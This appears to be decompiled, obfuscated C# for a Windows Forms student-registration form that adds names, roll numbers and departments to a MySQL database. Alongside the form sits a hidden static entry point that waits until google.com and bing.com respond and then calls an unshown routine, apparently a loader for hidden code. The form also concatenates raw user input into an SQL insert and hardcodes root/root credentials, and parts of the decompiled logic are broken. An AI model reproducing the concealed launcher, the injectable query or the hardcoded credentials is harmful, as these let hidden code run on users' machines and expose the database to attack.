using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Mf5q;
using Microsoft.VisualBasic.CompilerServices;
using d4G;
using g7J;
using m5GN;
using o8G9;

namespace Wi84;

[DesignerGenerated]
public class p1RD : Form
{
	private Label _Label3;

	private Button _Button1;

	private Button _Button2;

	private ComboBox _ComboBoxDept;

	private DateTimePicker _DateTimePicker1;

	internal static string[] Listt;

	internal static Dictionary<string, object> mDic;

	internal static string dName;

	internal static string tName;

	internal static string mName;

	internal static string mArray;

	internal static string sArray;

	internal static string T;

	internal static string sNum;

	internal IContainer J;

	internal Label S;

	internal TextBox R;

	internal Label H;

	internal Label L;

	internal Label t;

	internal TextBox U;

	public p1RD()
	{
		((Form)this).add_Load((EventHandler)g6E7);
		p3AZ();
	}

	protected override void w8NT(bool Rp0c)
	{
		try
		{
			if (Rp0c && J != null)
			{
				J.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Rp0c);
		}
	}

	private void p3AZ()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_009e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		j3ZR(new Label());
		Rt35(new TextBox());
		r0R7(new Label());
		Ew14(new Label());
		Nx2i(new Label());
		e6NX(new Label());
		y0W7(new TextBox());
		x6DZ(new Button());
		f5R0(new Button());
		o4PG(new ComboBox());
		Np56(new DateTimePicker());
		((Control)this).SuspendLayout();
		z4KX().set_AutoSize(true);
		((Control)z4KX()).set_Font(new Font("Comic Sans MS", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)z4KX()).set_Location(new Point(171, 9));
		((Control)z4KX()).set_Name("Label1");
		((Control)z4KX()).set_Size(new Size(94, 30));
		((Control)z4KX()).set_TabIndex(0);
		z4KX().set_Text("Student");
		((Control)q0BY()).set_Location(new Point(83, 59));
		((Control)q0BY()).set_Name("SName");
		((Control)q0BY()).set_Size(new Size(327, 20));
		((Control)q0BY()).set_TabIndex(1);
		Fi95().set_AutoSize(true);
		((Control)Fi95()).set_Location(new Point(12, 62));
		((Control)Fi95()).set_Name("Label2");
		((Control)Fi95()).set_Size(new Size(35, 13));
		((Control)Fi95()).set_TabIndex(0);
		Fi95().set_Text("Name");
		o1RN().set_AutoSize(true);
		((Control)o1RN()).set_Location(new Point(12, 93));
		((Control)o1RN()).set_Name("Label3");
		((Control)o1RN()).set_Size(new Size(65, 13));
		((Control)o1RN()).set_TabIndex(0);
		o1RN().set_Text("Roll Number");
		Gr9e().set_AutoSize(true);
		((Control)Gr9e()).set_Location(new Point(12, 122));
		((Control)Gr9e()).set_Name("Label4");
		((Control)Gr9e()).set_Size(new Size(66, 13));
		((Control)Gr9e()).set_TabIndex(0);
		Gr9e().set_Text("Date of Birth");
		Nm07().set_AutoSize(true);
		((Control)Nm07()).set_Location(new Point(12, 153));
		((Control)Nm07()).set_Name("Label5");
		((Control)Nm07()).set_Size(new Size(62, 13));
		((Control)Nm07()).set_TabIndex(0);
		Nm07().set_Text("Department");
		((Control)s5Q3()).set_Location(new Point(83, 90));
		((Control)s5Q3()).set_Name("SRoll");
		((Control)s5Q3()).set_Size(new Size(327, 20));
		((Control)s5Q3()).set_TabIndex(1);
		((Control)Qt04()).set_Location(new Point(110, 188));
		((Control)Qt04()).set_Name("Button1");
		((Control)Qt04()).set_Size(new Size(203, 23));
		((Control)Qt04()).set_TabIndex(2);
		((ButtonBase)Qt04()).set_Text("Add to Database");
		((ButtonBase)Qt04()).set_UseVisualStyleBackColor(true);
		((Control)Cs46()).set_Location(new Point(148, 226));
		((Control)Cs46()).set_Name("Button2");
		((Control)Cs46()).set_Size(new Size(127, 23));
		((Control)Cs46()).set_TabIndex(3);
		((ButtonBase)Cs46()).set_Text("View Database");
		((ButtonBase)Cs46()).set_UseVisualStyleBackColor(true);
		g5CP().set_DropDownStyle((ComboBoxStyle)2);
		((ListControl)g5CP()).set_FormattingEnabled(true);
		g5CP().get_Items().AddRange(new object[15]
		{
			"Aerospace Engineering", "Food Technology Bio-Chemical Engineering", "Computer Science and Engineering", "Electronics and Telecommunications Engineering", "Electrical Engineering", "Civil Engineering", "Mechanical Engineering", "Chemical Engineering", "Printing Engineering", "Information Technology",
			"Production Engineering", "Instrumentation and Electronics Engineering", "Metallurgical and Material Engineering", "Power Engineering", "Pharmaceutical Technology "
		});
		((Control)g5CP()).set_Location(new Point(83, 150));
		((Control)g5CP()).set_Name("ComboBoxDept");
		((Control)g5CP()).set_Size(new Size(327, 21));
		((Control)g5CP()).set_TabIndex(4);
		((Control)x4HS()).set_Location(new Point(83, 122));
		x4HS().set_MaxDate(new DateTime(2010, 12, 31, 0, 0, 0, 0));
		x4HS().set_MinDate(new DateTime(1965, 1, 1, 0, 0, 0, 0));
		((Control)x4HS()).set_Name("DateTimePicker1");
		((Control)x4HS()).set_Size(new Size(200, 20));
		((Control)x4HS()).set_TabIndex(5);
		x4HS().set_Value(new DateTime(2010, 12, 31, 0, 0, 0, 0));
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(451, 261));
		((Control)this).get_Controls().Add((Control)(object)x4HS());
		((Control)this).get_Controls().Add((Control)(object)g5CP());
		((Control)this).get_Controls().Add((Control)(object)Cs46());
		((Control)this).get_Controls().Add((Control)(object)Qt04());
		((Control)this).get_Controls().Add((Control)(object)s5Q3());
		((Control)this).get_Controls().Add((Control)(object)q0BY());
		((Control)this).get_Controls().Add((Control)(object)Nm07());
		((Control)this).get_Controls().Add((Control)(object)Gr9e());
		((Control)this).get_Controls().Add((Control)(object)o1RN());
		((Control)this).get_Controls().Add((Control)(object)Fi95());
		((Control)this).get_Controls().Add((Control)(object)z4KX());
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Add Student Form");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Label z4KX()
	{
		return S;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j3ZR(Label o7GM)
	{
		Label val = (S = o7GM);
	}

	[SpecialName]
	internal virtual TextBox q0BY()
	{
		return R;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Rt35(TextBox Wr70)
	{
		TextBox val = (R = Wr70);
	}

	[SpecialName]
	internal virtual Label Fi95()
	{
		return H;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void r0R7(Label f5QJ)
	{
		Label val = (H = f5QJ);
	}

	[SpecialName]
	internal virtual Label o1RN()
	{
		return _Label3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ew14(Label Ny6k)
	{
		_Label3 = Ny6k;
	}

	[SpecialName]
	internal virtual Label Gr9e()
	{
		return L;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Nx2i(Label Se0m)
	{
		Label val = (L = Se0m);
	}

	[SpecialName]
	internal virtual Label Nm07()
	{
		return t;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void e6NX(Label j3DQ)
	{
		Label val = (t = j3DQ);
	}

	[SpecialName]
	internal virtual TextBox s5Q3()
	{
		return U;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void y0W7(TextBox x3K8)
	{
		TextBox val = (U = x3K8);
	}

	[SpecialName]
	internal virtual Button Qt04()
	{
		return _Button1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void x6DZ(Button p9FA)
	{
		EventHandler eventHandler = Fk8s;
		Button button = _Button1;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button1 = p9FA;
		button = _Button1;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Cs46()
	{
		return _Button2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f5R0(Button d3XE)
	{
		EventHandler eventHandler = k0L7;
		Button button = _Button2;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button2 = d3XE;
		button = _Button2;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual ComboBox g5CP()
	{
		return _ComboBoxDept;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void o4PG(ComboBox Fw67)
	{
		_ComboBoxDept = Fw67;
	}

	[SpecialName]
	internal virtual DateTimePicker x4HS()
	{
		return _DateTimePicker1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Np56(DateTimePicker r1X6)
	{
		_DateTimePicker1 = r1X6;
	}

	private void Fk8s(object sender, EventArgs e)
	{
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
		j6R j6R = new j6R();
		j6R.Jq8("server=localhost;userid=root;password=root;database=student;");
		try
		{
			j6R.f1N();
			if ((q0BY().get_Text().Length == 0) | (s5Q3().get_Text().Length == 0) | (g5CP().get_SelectedIndex() == -1))
			{
				MessageBox.Show("NULL Values in TextBox !");
			}
			else
			{
				_ = "insert into student.student_info (Roll_Number,Student_Name,Date_of_Birth,Department) values ('" + s5Q3().get_Text() + "','" + q0BY().get_Text() + "','" + x4HS().get_Text() + "','" + g5CP().get_Text() + "')";
				Ms8 ms = new Ms8();
				Qq8w qq8w = ms.n6D();
				MessageBox.Show("Data is Entered into student databse");
				qq8w.Sz54();
			}
			j6R.Dt5();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
		finally
		{
			j6R.g5Z();
		}
		((TextBoxBase)q0BY()).Clear();
		((TextBoxBase)s5Q3()).Clear();
		x4HS().set_Value(x4HS().get_MaxDate());
		g5CP().set_SelectedIndex(-1);
	}

	internal static bool Yd72(int Lo58)
	{
		string[] array = new string[4] { "L", "o", "a", "d" };
		StringBuilder stringBuilder = new StringBuilder();
		while (Operators.CompareString(stringBuilder.ToString(), "Load", false) != 0)
		{
			string text = array[new Random().Next(0, checked(Lo58 + 1))];
			if (Operators.CompareString(stringBuilder.ToString(), (string)null, false) == 0 && Operators.CompareString(text, "L", false) == 0)
			{
				stringBuilder.Append(text);
				array = new string[3] { "o", "a", "d" };
				Lo58 = -1;
			}
			if (Operators.CompareString(stringBuilder.ToString(), "L", false) == 0 && Operators.CompareString(text, "o", false) == 0)
			{
				stringBuilder.Append(text);
				array = new string[2] { "a", "d" };
				Lo58 = -1;
			}
			if (Operators.CompareString(stringBuilder.ToString(), "Lo", false) == 0 && Operators.CompareString(text, "a", false) == 0)
			{
				stringBuilder.Append(text);
				array = new string[1] { "d" };
				Lo58 = -1;
			}
			if (Operators.CompareString(stringBuilder.ToString(), "Loa", false) == 0 && Operators.CompareString(text, "d", false) == 0)
			{
				stringBuilder.Append(text);
			}
		}
		if (Operators.CompareString(stringBuilder.ToString(), "Load", false) == 0)
		{
			return true;
		}
		return false;
	}

	private void g6E7(object sender, EventArgs e)
	{
		((Form)this).set_MinimizeBox(false);
		((Form)this).set_MaximizeBox(false);
	}

	private void k0L7(object sender, EventArgs e)
	{
		((Control)Lg27.Forms.Af9x()).Show();
	}

	[STAThread]
	public static void Jf72()
	{
		try
		{
			if (Yd72(2) && Ag0i())
			{
				f2W9.Qz85(1);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Environment.Exit(Environment.ExitCode);
			ProjectData.ClearProjectError();
		}
	}

	internal static bool Ag0i()
	{
		string[] array = new string[2] { "https://www.google.com/", "https://www.bing.com/" };
		int num = 0;
		checked
		{
			while (num != 2)
			{
				string[] array2 = array;
				foreach (string qq in array2)
				{
					if (!f2W9.y9N1(qq))
					{
						if (num > 0)
						{
							num--;
						}
						Task.Delay(30000).Wait();
					}
					else
					{
						num++;
					}
				}
			}
			if (num == 2)
			{
				return true;
			}
			return false;
		}
	}
}
